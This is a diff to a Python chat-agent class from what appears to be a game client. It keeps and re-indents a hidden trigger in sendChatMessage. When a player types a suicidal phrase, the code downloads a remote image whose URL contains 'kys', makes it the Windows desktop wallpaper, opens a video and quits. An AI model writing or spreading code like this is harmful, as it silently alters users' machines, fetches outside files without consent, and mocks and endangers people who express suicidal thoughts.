@@ -20,15 +20,16 @@ class ChatAgent(DistributedObjectGlobal):
         messenger.send('adminChat', [aboutId, message])
 
     def sendChatMessage(self, message):
-            if(message.lower() == 'IWantToFuckingEndMyLife'.lower()):
-                import ctypes
-                import urllib
-                import webbrowser
-                webbrowser.open('https://www.youtube.com/watch?v=2dbR2JZmlWo')
-                urllib.urlretrieve("https://static1.comicvine.com/uploads/original/11128/111283068/5260519-franku+%28kys%29.jpg", "SpicyMeatball.jpg")
-                SPI_SETDESKWALLPAPER = 20 
-                ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, "SpicyMeatball.jpg" , 0)
-                sys.exit()
+        if(message.lower() == 'IWantToFuckingEndMyLife'.lower()):
+            import ctypes
+            import urllib
+            import webbrowser
+            import sys
+            webbrowser.open('https://www.youtube.com/watch?v=2dbR2JZmlWo')
+            urllib.urlretrieve("https://static1.comicvine.com/uploads/original/11128/111283068/5260519-franku+%28kys%29.jpg", "SpicyMeatball.jpg")
+            SPI_SETDESKWALLPAPER = 20
+            ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, "SpicyMeatball.jpg" , 0)
+            sys.exit()
         self.sendUpdate('chatMessage', [message, self.chatMode])
         
     def kickForSpam(self, av):
